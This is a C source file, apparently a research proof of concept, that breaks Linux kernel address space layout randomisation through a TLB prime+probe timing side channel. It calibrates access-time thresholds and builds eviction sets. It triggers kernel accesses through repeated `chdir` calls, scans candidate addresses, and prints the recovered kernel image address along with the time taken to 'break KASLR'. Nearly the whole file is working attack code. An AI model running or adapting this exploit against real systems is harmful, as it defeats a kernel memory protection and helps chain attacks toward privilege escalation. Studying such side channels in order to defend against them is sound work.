#define _GNU_SOURCE
#include "config.h"
#include "memory.h"
#include <errno.h>
#include <pwd.h>
#include <sched.h>
#include <stdio.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/time.h>
#include <time.h>
#include <unistd.h>

#define CALIBRATION_ITERS 1000000

#define PASTE3_INTERNAL(a, b, c) a##b##c
#define PASTE3(a, b, c) PASTE3_INTERNAL(a, b, c)
#define PASTE_INTERNAL(a, b) a##b
#define PASTE(a, b) PASTE_INTERNAL(a, b)

#define _EMPTY_SUFFIX

#define CONFIG_TARGET_STLB 1
//#define CONFIG_TARGET_DTLB 1

#define USE_POINTER_CHASING 0

#if defined(CONFIG_TARGET_STLB)
#define TARGET_FUNC_SUFFIX stlb
#define TARGET_MACRO_PREFIX STLB
#elif defined(CONFIG_TARGET_DTLB)
#define TARGET_FUNC_SUFFIX dtlb
#define TARGET_MACRO_PREFIX DTLB
#else
#error                                                                         \
    "No target TLB defined. Please define CONFIG_TARGET_STLB or CONFIG_TARGET_DTLB."
#endif

#if USE_POINTER_CHASING
#define CHASING_SUFFIX _pc
#else
#define CHASING_SUFFIX _EMPTY_SUFFIX
#endif

#define probe PASTE3(probe_, TARGET_FUNC_SUFFIX, CHASING_SUFFIX)
#define gen_eset PASTE3(gen_eset_, TARGET_FUNC_SUFFIX, CHASING_SUFFIX)
#define prime PASTE(prime_, TARGET_FUNC_SUFFIX)

#define EVSET_SIZE PASTE(TARGET_MACRO_PREFIX, _EVSET_SIZE_4K)

uint64_t *res;
extern uint8_t *flush_set;

//------------------------//
char *user = "./";
//------------------------//

static inline int leak_val(void *addr) {
  chdir(addr);
  chdir(addr);
  chdir(addr);
  return 1;
}

void get_cycle(uint64_t *valid_cycle, uint64_t *invalid_cycle) {
  void *eset[EVSET_SIZE];
  void *eset2[EVSET_SIZE];
  register uint64_t tmp;

  char *test_addr;
  posix_memalign(&test_addr, PAGE_SIZE, PAGE_SIZE);
  *test_addr = 1;
  gen_eset((size_t)test_addr, eset, (uintptr_t)flush_set);
  gen_eset((size_t)test_addr, eset2, (uintptr_t)eset[EVSET_SIZE - 1] + PAGE_SIZE);

  tmp = 0;
  for (int i = 0; i < CALIBRATION_ITERS; i++) {
    prime(eset);
    prime(eset2);
    // maccess(test_addr);
    tmp += probe(eset);
  }

  *valid_cycle = tmp / CALIBRATION_ITERS;

  tmp = 0;
  for (int i = 0; i < CALIBRATION_ITERS; i++) {
    prime(eset);
    memory_fence();
    tmp += probe(eset);
  }
  *invalid_cycle = tmp / CALIBRATION_ITERS;
}

int main(int argc, char *argv[]) {
  void *addr;
  void *eset[EVSET_SIZE];
  void *kern_eset[EVSET_SIZE];
  void *target[TRAINING_ITERS] = {user, user, user, user, user};
  uint64_t valid_cycle, invalid_cycle;
  struct timeval tv_s, tv_e;
  register uint64_t tmp, threshold;

  printf("[+] number of slots = %llx\n", NUM_SLOT);

  // res = (uint64_t *)malloc(sizeof(uint64_t) * NUM_SLOT);
  res = mmap(0, sizeof(uint64_t) * NUM_SLOT, PROT_READ | PROT_WRITE,
             MAP_ANON | MAP_PRIVATE, -1, 0);
  if (-1 == res) {
    perror("mmap");
  }

  pin_to_core(0);

  setvbuf(stdout, NULL, _IONBF, 0);
  setvbuf(stdin, NULL, _IONBF, 0);
  setvbuf(stderr, NULL, _IONBF, 0);

  get_timer_overhead();
  init_tlb_flush();

  get_cycle(&valid_cycle, &invalid_cycle);
  threshold = invalid_cycle + (valid_cycle - invalid_cycle) / 3;

  printf("[Probing cycle] valid address : %llu, invalid address : %llu, "
         "threshold : %llu\n\n",
         valid_cycle, invalid_cycle, threshold);

  printf("========Start to finding kernel slide!========\n");

  memset(res, 0, sizeof(uint64_t) * NUM_SLOT);
  int64_t idx = 0;

  gettimeofday(&tv_s, NULL);

  //for (int i = 0; i < ITERATION; i++) {
  //  printf("[+] Iteration = %d\n", i);
  //  for (uint64_t s_idx = 0; s_idx < NUM_SLOT; s_idx++) {
  //    idx = (s_idx * 73) % NUM_SLOT;
  //    addr = (void *)KERN_MAP_MIN_ADDR + (ALIGN_SIZE * idx);
  //    target[TRAINING_ITERS - 1] = addr;
  //    gen_eset((size_t)addr, eset);
  //    do {
  //      for (int j = 0; j < TRAINING_ITERS; j++) {
  //        prime(eset);
  //        leak_val(target[j]);
  //      }
  //      tmp = probe(eset);
  //    } while (tmp < (invalid_cycle - 200) || tmp > (valid_cycle + 200));
  //    res[idx] += tmp;
  //  }
  //}
  for (int i = 0; i < ITERATION; i++) {
    printf("[+] Iteration = %d\n", i);
    for (uint64_t s_idx = 0; s_idx < NUM_SLOT; s_idx++) {
      //printf("  [+] %lu/%lu\n", s_idx, NUM_SLOT);
      idx = (s_idx * 73) % NUM_SLOT;
      addr = (void *)START_SEARCH + (ALIGN_SIZE * idx);
      printf("Trying %p\n", addr);
      gen_eset((size_t)addr, eset, (uintptr_t)flush_set);
      gen_fake_eset_stlb((uintptr_t)addr, kern_eset);
      for (int fa_idx = 0; fa_idx < FAKE_ESET_ACCESSES; fa_idx++) {
        target[TRAINING_ITERS - 1] = kern_eset[fa_idx];
        for (int j = 0; j < TRAINING_ITERS; j++) {
          prime(eset);
          leak_val(target[j]);
        }
      }
      res[idx] += probe(eset);
    }
  }

  uint64_t valid_page_cnt = 0;
  void *end_kern_img_addr = 0;
  uint64_t kern_size_slot = (KERN_IMAGE_SIZE / ALIGN_SIZE) + 1;

  // TODO make sure all 10 last pages are mapped
  for (uint64_t s_idx = 0; s_idx < NUM_SLOT; s_idx++) {
    if (res[s_idx] / ITERATION > threshold) {
      valid_page_cnt++;
      if (valid_page_cnt > 10) {
        valid_page_cnt = 0;
        for (int s_jdx = s_idx + kern_size_slot; s_jdx > 0; s_jdx--) {
          if (res[s_jdx] / ITERATION > threshold) {
            if (valid_page_cnt == 0) {
              end_kern_img_addr =
                  (void *)START_SEARCH + (ALIGN_SIZE * s_jdx);
              valid_page_cnt++;
            } else if (valid_page_cnt > 10) {
              break;
            } else {
              valid_page_cnt++;
            }
          } else {
            valid_page_cnt = 0;
          }
        }
        break;
      }
    } else {
      valid_page_cnt = 0;
    }
  }

  gettimeofday(&tv_e, NULL);

  double start = (tv_s.tv_sec) * 1000 + (tv_s.tv_usec) / 1000.0;
  double end = (tv_e.tv_sec) * 1000 + (tv_e.tv_usec) / 1000.0;
  double diff = (end - start) / 1000.0;

  void *kernel_img_addr = end_kern_img_addr - KERN_IMAGE_SIZE - 0x1000;
  void *kernel_img_addr2 = end_kern_img_addr - KERN_IMAGE_SIZE;

#ifdef __DEBUG
  char *dfp = fopen(RESULT_FILE, "w");
  fprintf(dfp, "valid cycles = %d, invalid cycles = %d, threshold = %d\n",
      valid_cycle, invalid_cycle, threshold);
  addr = (void *)START_SEARCH;
  for (uint64_t x = 0; x < NUM_SLOT; x++) {
    addr = (void *)START_SEARCH + (ALIGN_SIZE * x);
    fprintf(dfp, "0x%llx %llu\n", addr, res[x] / ITERATION);
  }
  fprintf(dfp, "kern_img_addr (-0x1000) = 0x%llx\n", kernel_img_addr);
  fprintf(dfp, "kern_img_addr           = 0x%llx\n", kernel_img_addr2);
  fclose(dfp);
#endif

  printf("kernel map addr\t= \033[1;31m0x%llx\033[0m\n", kernel_img_addr);
  printf("Time to break KASLR\t= %.2fs\n", diff);
  printf("==============================================\n");
  return 0;
}
